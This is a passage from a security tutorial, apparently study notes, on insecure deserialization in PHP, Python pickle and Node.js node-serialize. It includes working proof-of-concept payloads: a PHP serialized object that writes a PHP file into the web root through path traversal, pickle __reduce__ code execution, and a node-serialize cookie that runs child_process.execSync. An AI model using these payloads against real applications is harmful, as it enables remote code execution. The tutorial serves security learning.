      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>O:4:<span class="s2">"Auth"</span>:3:<span class="o">{</span>s:4:<span class="s2">"auth"</span><span class="p">;</span>s:18:<span class="s2">"&lt;?php phpinfo();?&gt;"</span><span class="p">;</span>s:27:<span class="s2">"../../var/www/html/test.php"</span><span class="p">;</span>s:4:<span class="s2">"role"</span><span class="p">;</span>s:5:<span class="s2">"admin"</span><span class="p">;</span>s:4<span class="p">;</span><span class="o">}</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="other-serialization"><span class="me-2">Other Serialization</span><a href="#other-serialization" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<hr />

<p><em>When looking for deserialization vulnerabilities, should <strong>AWAYS</strong> pay attention to data that</em></p>

<ul>
  <li>Contain strings that are similar to method names or object names</li>
  <li>Contain binary data</li>
  <li>Is in a complex, structured form</li>
</ul>

<p>Source code of the target software is available, should inspect it for the presence of serialization-related methods</p>

<hr />

<h3 id="python"><span class="me-2">Python</span><a href="#python" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Serialized objects in Python are binary and not human-readable.</p>

<p>Additionally, in Python, there is a method similar to the <code class="language-plaintext highlighter-rouge">__destruct</code> magic method in PHP called <code class="language-plaintext highlighter-rouge">__reduce</code>. What is very convenient is that it is possible to control this <code class="language-plaintext highlighter-rouge">__reduce</code> function. Furthermore, there is no default function for serialization in Python; you need to import a library called <code class="language-plaintext highlighter-rouge">pickle</code>.</p>

<p><strong>Initial Example</strong></p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">pickle</span>

<span class="k">class</span> <span class="nc">Example</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>

    <span class="k">def</span> <span class="nf">show_example</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Hello, </span><span class="sh">"</span> <span class="o">+</span> <span class="n">name</span><span class="p">)</span>

    
<span class="n">deserialization_example</span> <span class="o">=</span> <span class="nc">Example</span><span class="p">()</span>
<span class="n">deserialization_example</span><span class="p">.</span><span class="nf">show_example</span><span class="p">(</span><span class="sh">"</span><span class="s">World</span><span class="sh">"</span><span class="p">)</span>

<span class="n">serialized_object</span> <span class="o">=</span> <span class="n">pickle</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">deserialization_example</span><span class="p">)</span> <span class="c1"># serialize the object
</span><span class="nf">print</span><span class="p">(</span><span class="n">serialized_object</span><span class="p">)</span>

<span class="n">new_object</span> <span class="o">=</span> <span class="n">pickle</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="n">serialized_object</span><span class="p">)</span> <span class="c1"># unserialize the object
</span><span class="n">new_object</span><span class="p">.</span><span class="nf">show_example</span><span class="p">(</span><span class="sh">"</span><span class="s">Show example without serialization</span><span class="sh">"</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p><strong>Output</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>Hello, World
b'\x80\x04\x95\x1b\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x07example\x94\x93\x94)\x81\x94.'
Hello, Show example without serialization
</pre></td></tr></tbody></table></code></div></div>

<p>Once you have control of the value that will be deserialized <code class="language-plaintext highlighter-rouge">deserialization_example</code>, it is possible to execute remote code.</p>

<p>Remembering the <code class="language-plaintext highlighter-rouge">__reduce__</code> method, note the following example.</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">pickle</span>

<span class="k">class</span> <span class="nc">example</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>

    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="nf">return </span><span class="p">(</span><span class="k">print</span><span class="p">,</span> <span class="p">(</span><span class="sh">"</span><span class="s">test</span><span class="sh">"</span><span class="p">,</span> <span class="p">))</span>
    
    <span class="k">def</span> <span class="nf">show_example</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Hello, </span><span class="sh">"</span> <span class="o">+</span> <span class="n">name</span><span class="p">)</span>

    
<span class="n">desserialization_example</span> <span class="o">=</span> <span class="nf">example</span><span class="p">()</span>
<span class="n">desserialization_example</span><span class="p">.</span><span class="nf">show_example</span><span class="p">(</span><span class="sh">"</span><span class="s">World</span><span class="sh">"</span><span class="p">)</span>

<span class="n">serialized_object</span> <span class="o">=</span> <span class="n">pickle</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">desserialization_example</span><span class="p">)</span> <span class="c1"># serialize the object
</span><span class="nf">print</span><span class="p">(</span><span class="n">serialized_object</span><span class="p">)</span>

<span class="n">new_object</span> <span class="o">=</span> <span class="n">pickle</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="n">serialized_object</span><span class="p">)</span> <span class="c1"># unserialize the object
</span><span class="n">new_object</span><span class="p">.</span><span class="nf">show_example</span><span class="p">(</span><span class="sh">"</span><span class="s">Show example without serialization</span><span class="sh">"</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>Hello, World
b'\x80\x04\x95"\x00\x00\x00\x00\x00\x00\x00\x8c\x08builtins\x94\x8c\x05print\x94\x93\x94\x8c\x05teste\x94\x85\x94R\x94.'
test
Traceback (most recent call last):
  File "c:\Users\arthu\Desktop\eWPTX\example.py", line 19, in &lt;module&gt;
    new_object.show_example("Show example without serialization")
    ^^^^^^^^^^^^^^^^^^^^^^^
AttributeError: 'NoneType' object has no attribute 'show_example'
</pre></td></tr></tbody></table></code></div></div>

<p>Note that it serialized the object with the <code class="language-plaintext highlighter-rouge">print</code> function. After that, when it was deserialized, the “test” was called.</p>

<p>However, note that an error also occurred. This happens because when <code class="language-plaintext highlighter-rouge">__reduce__</code> is used, everything in the object is ignored, and only the return value of the function is “carried along.”</p>

<p>Now imagine in a new context.</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">pickle</span> 

<span class="k">class</span> <span class="nc">malicous_code</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="nf">return </span><span class="p">(</span><span class="k">print</span><span class="p">,</span> <span class="p">(</span><span class="sh">"</span><span class="s">I am a malicious code</span><span class="sh">"</span><span class="p">,))</span>
    
<span class="n">object_malicous</span> <span class="o">=</span> <span class="n">pickle</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="nf">malicous_code</span><span class="p">())</span>
<span class="nf">print</span><span class="p">(</span><span class="n">object_malicous</span><span class="p">)</span>

<span class="n">pickle</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="n">object_malicous</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>b'\x80\x04\x952\x00\x00\x00\x00\x00\x00\x00\x8c\x08builtins\x94\x8c\x05print\x94\x93\x94\x8c\x15I am a malicious code\x94\x85\x94R\x94.'
I am a malicious code
</pre></td></tr></tbody></table></code></div></div>

<p>Taking the output value and passing it <strong>directly</strong> into <code class="language-plaintext highlighter-rouge">pickle.loads</code></p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">pickle</span> 

<span class="n">pickle</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="se">\x80\x04\x95</span><span class="s">2</span><span class="se">\x00\x00\x00\x00\x00\x00\x00\x8c\x08</span><span class="s">builtins</span><span class="se">\x94\x8c\x05</span><span class="s">print</span><span class="se">\x94\x93\x94\x8c\x15</span><span class="s">I am a malicious code</span><span class="se">\x94\x85\x94</span><span class="s">R</span><span class="se">\x94</span><span class="s">.</span><span class="sh">"</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>I am a malicious code
</pre></td></tr></tbody></table></code></div></div>

<p>Therefore, if it is possible to obtain control of the object in <code class="language-plaintext highlighter-rouge">pickle.loads</code>, you have control of the application.</p>

<hr />

<h3 id="nodejs"><span class="me-2">NodeJS</span><a href="#nodejs" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Just like in Python, the serialization library <strong>is not default in Node.js</strong>. The library that contains functions to serialize/deserialize objects is called <code class="language-plaintext highlighter-rouge">node-serialize</code>.</p>

<p>However, unlike Python, it is <strong>human-readable</strong>.</p>

<p>Consider the following example, where it is desirable to manipulate an object to transform it into JSON:</p>

<div class="language-jsx highlighter-rouge"><div class="code-header">
        <span data-label-text="Jsx"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">nodeserialize</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">node-serialize</span><span class="dl">'</span><span class="p">);</span>

<span class="kd">let</span> <span class="nx">user</span> <span class="o">=</span> <span class="p">{};</span>

<span class="nx">user</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">Hendrich</span><span class="dl">'</span><span class="p">;</span>
<span class="nx">user</span><span class="p">.</span><span class="nx">email</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">hendrich@blog.com.br</span><span class="dl">'</span>

<span class="nx">serialziedObj</span> <span class="o">=</span> <span class="nx">nodeserialize</span><span class="p">.</span><span class="nf">serialize</span><span class="p">(</span><span class="nx">user</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Serialzied Object: </span><span class="dl">"</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">serialziedObj</span><span class="p">);</span>

<span class="nx">unserializeObj</span> <span class="o">=</span> <span class="nx">nodeserialize</span><span class="p">.</span><span class="nf">unserialize</span><span class="p">(</span><span class="nx">serialziedObj</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Unserialzied Object: </span><span class="dl">"</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">unserializeObj</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>Serialzied Object: 
{"name":"Hendrich","email":"hendrich@blog.com.br"}
Unserialzied Object: 
{ name: 'Hendrich', email: 'hendrich@blog.com.br' }
</pre></td></tr></tbody></table></code></div></div>

<p>The cool thing is that it is possible to pass functions within the parameter, just like in Python. There is no magic method responsible for instantiating the class.</p>

<p>You can instantiate a function within the object. For example:</p>

<div class="language-jsx highlighter-rouge"><div class="code-header">
        <span data-label-text="Jsx"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">nodeserialize</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">node-serialize</span><span class="dl">'</span><span class="p">);</span>

<span class="kd">let</span> <span class="nx">user</span> <span class="o">=</span> <span class="p">{};</span>

<span class="nx">user</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">Hendrich</span><span class="dl">'</span><span class="p">;</span>
<span class="nx">user</span><span class="p">.</span><span class="nx">email</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">hendrich@blog.com.br</span><span class="dl">'</span>
<span class="nx">user</span><span class="p">.</span><span class="nx">getDetails</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">return</span> <span class="dl">"</span><span class="s2">test</span><span class="dl">"</span><span class="p">;</span>
<span class="p">}</span>

<span class="nx">serialziedObj</span> <span class="o">=</span> <span class="nx">nodeserialize</span><span class="p">.</span><span class="nf">serialize</span><span class="p">(</span><span class="nx">user</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">serialziedObj</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>{"name":"Hendrich","email":"hendrich@blog.com.br","getDetails":"_$$ND_FUNC$$_function() {\r\n    return \"test\";\r\n}"}
</pre></td></tr></tbody></table></code></div></div>

<p>In other words, it also serializes the function, allowing it to be reused from one location to another. Now, see what happens when deserializing:</p>

<div class="language-jsx highlighter-rouge"><div class="code-header">
        <span data-label-text="Jsx"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">nodeserialize</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">node-serialize</span><span class="dl">'</span><span class="p">);</span>

<span class="kd">let</span> <span class="nx">user</span> <span class="o">=</span> <span class="p">{};</span>

<span class="nx">user</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">Hendrich</span><span class="dl">'</span><span class="p">;</span>
<span class="nx">user</span><span class="p">.</span><span class="nx">email</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">hendrich@blog.com.br</span><span class="dl">'</span>
<span class="nx">user</span><span class="p">.</span><span class="nx">getDetails</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">return</span> <span class="dl">"</span><span class="s2">test</span><span class="dl">"</span><span class="p">;</span>
<span class="p">}</span>

<span class="nx">serialziedObj</span> <span class="o">=</span> <span class="nx">nodeserialize</span><span class="p">.</span><span class="nf">serialize</span><span class="p">(</span><span class="nx">user</span><span class="p">);</span>
<span class="nx">obj</span> <span class="o">=</span> <span class="nx">nodeserialize</span><span class="p">.</span><span class="nf">unserialize</span><span class="p">(</span><span class="nx">serialziedObj</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">obj</span><span class="p">.</span><span class="nf">getDetails</span><span class="p">());</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>test
</pre></td></tr></tbody></table></code></div></div>

<p>Obviously, if this happens within the context of a Node.js application where it serializes a function, then sends it to the user’s browser to be used in an application, it would be possible to modify the function to achieve RCE. But this does NOT happen in real scenarios (or at least I’ve never seen it).</p>

<p>However, there is a scenario where, during unserialization, it is possible to force the function to be called.</p>

<p>Observe the following code:</p>

<div class="language-jsx highlighter-rouge"><div class="code-header">
        <span data-label-text="Jsx"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">nodeserialize</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">node-serialize</span><span class="dl">'</span><span class="p">);</span>

<span class="kd">let</span> <span class="nx">user</span> <span class="o">=</span> <span class="p">{};</span>

<span class="nx">user</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">Hendrich</span><span class="dl">'</span><span class="p">;</span>
<span class="nx">user</span><span class="p">.</span><span class="nx">email</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">hendrich@blog.com.br</span><span class="dl">'</span>
<span class="nx">user</span><span class="p">.</span><span class="nx">getDetails</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">test</span><span class="dl">"</span><span class="p">);</span>
<span class="p">}</span>

<span class="nx">serialziedObj</span> <span class="o">=</span> <span class="nx">nodeserialize</span><span class="p">.</span><span class="nf">serialize</span><span class="p">(</span><span class="nx">user</span><span class="p">);</span>
<span class="nx">obj</span> <span class="o">=</span> <span class="nx">nodeserialize</span><span class="p">.</span><span class="nf">unserialize</span><span class="p">(</span><span class="nx">serialziedObj</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">obj</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>{
  name: 'Hendrich',
  email: 'hendrich@blog.com.br',
  getDetails: [Function (anonymous)]
}
</pre></td></tr></tbody></table></code></div></div>

<p>Note that it did not call <code class="language-plaintext highlighter-rouge">console.log("test")</code>.</p>

<p>Observing the JSON parameter formed during serialization, you can see that the function indeed exists, but why wasn’t it executed?</p>

<div class="language-json highlighter-rouge"><div class="code-header">
        <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="w">
    </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Hendrich"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"email"</span><span class="p">:</span><span class="w"> </span><span class="s2">"hendrich@blog.com.br"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"getDetails"</span><span class="p">:</span><span class="w"> </span><span class="s2">"_$$ND_FUNC$$_function() {</span><span class="se">\r\n</span><span class="s2">    console.log(</span><span class="se">\"</span><span class="s2">test</span><span class="se">\"</span><span class="s2">);</span><span class="se">\r\n</span><span class="s2">}"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>To force the execution of this function during deserialization, you need to modify it as follows:</p>

<div class="language-json highlighter-rouge"><div class="code-header">
        <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="w">
    </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Hendrich"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"email"</span><span class="p">:</span><span class="w"> </span><span class="s2">"hendrich@blog.com.br"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"getDetails"</span><span class="p">:</span><span class="w"> </span><span class="s2">"_$$ND_FUNC$$_function() {</span><span class="se">\r\n</span><span class="s2">    console.log(</span><span class="se">\"</span><span class="s2">test</span><span class="se">\"</span><span class="s2">);</span><span class="se">\r\n</span><span class="s2">}()"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>This happens because during the deserialization process, it is necessary not only to instantiate a function but also to call it for execution.</p>

<div class="language-jsx highlighter-rouge"><div class="code-header">
        <span data-label-text="Jsx"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="o">&gt;</span> <span class="nx">nodeserialize</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">node-serialize</span><span class="dl">'</span><span class="p">);</span>
<span class="p">{</span>
  <span class="na">serialize</span><span class="p">:</span> <span class="p">[</span><span class="nc">Function </span><span class="p">(</span><span class="nx">anonymous</span><span class="p">)],</span>
  <span class="na">unserialize</span><span class="p">:</span> <span class="p">[</span><span class="nc">Function </span><span class="p">(</span><span class="nx">anonymous</span><span class="p">)]</span>
<span class="p">}</span>
<span class="o">&gt;</span> <span class="nx">nodeserialize</span><span class="p">.</span><span class="nf">unserialize</span><span class="p">(</span><span class="dl">'</span><span class="s1">{"myFunction":"_$$ND_FUNC$$_function(){console.log(</span><span class="se">\'</span><span class="s1">JUST DONT</span><span class="se">\'</span><span class="s1">)}"}</span><span class="dl">'</span><span class="p">);</span>
<span class="p">{</span> <span class="na">myFunction</span><span class="p">:</span> <span class="p">[</span><span class="nc">Function </span><span class="p">(</span><span class="nx">anonymous</span><span class="p">)]</span> <span class="p">}</span>
<span class="o">&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>It even identifies that it is a function but nothing happens. Now, adding <code class="language-plaintext highlighter-rouge">()</code> at the end of the function creation:</p>

<div class="language-jsx highlighter-rouge"><div class="code-header">
        <span data-label-text="Jsx"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="o">&gt;</span> <span class="nx">nodeserialize</span><span class="p">.</span><span class="nf">unserialize</span><span class="p">(</span><span class="dl">'</span><span class="s1">{"myFunction":"_$$ND_FUNC$$_function(){console.log(</span><span class="se">\'</span><span class="s1">JUST DONT</span><span class="se">\'</span><span class="s1">)}()"}</span><span class="dl">'</span><span class="p">);</span>
<span class="nx">JUST</span> <span class="nx">DONT</span>
<span class="p">{</span> <span class="nl">myFunction</span><span class="p">:</span> <span class="kc">undefined</span> <span class="p">}</span>
<span class="o">&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Thus, it is possible to generate a serialized object, obtain it, and modify it with the desired value for execution and add the <code class="language-plaintext highlighter-rouge">()</code> at the end.</p>

<p>In this way, it is necessary to understand what is inside the JSON, manipulate the values, and send them to the backend.</p>

<p>It is possible that an application sets a session cookie as JSON:</p>

<div class="language-jsx highlighter-rouge"><div class="code-header">
        <span data-label-text="Jsx"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="dl">"</span><span class="s2">username</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">hendrich@blog.com.br</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">:</span> <span class="mf">12453464564.2675</span><span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>So, in the place of the username, you could pass a malicious function to it:</p>

<div class="language-jsx highlighter-rouge"><div class="code-header">
        <span data-label-text="Jsx"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">nodeserialize</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">node-serialize</span><span class="dl">'</span><span class="p">);</span>

<span class="kd">let</span> <span class="nx">user</span> <span class="o">=</span> <span class="p">{};</span>

<span class="nx">user</span><span class="p">.</span><span class="nx">username</span><span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span><span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">child_process</span><span class="dl">'</span><span class="p">).</span><span class="nf">execSync</span><span class="p">(</span><span class="dl">'</span><span class="s1">sleep 5</span><span class="dl">'</span><span class="p">)};</span>
<span class="nx">user</span><span class="p">.</span><span class="nx">id</span> <span class="o">=</span> <span class="mf">12453464564.2675</span>
<span class="nx">serialziedObj</span> <span class="o">=</span> <span class="nx">nodeserialize</span><span class="p">.</span><span class="nf">serialize</span><span class="p">(</span><span class="nx">user</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">serialziedObj</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-jsx highlighter-rouge"><div class="code-header">
        <span data-label-text="Jsx"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
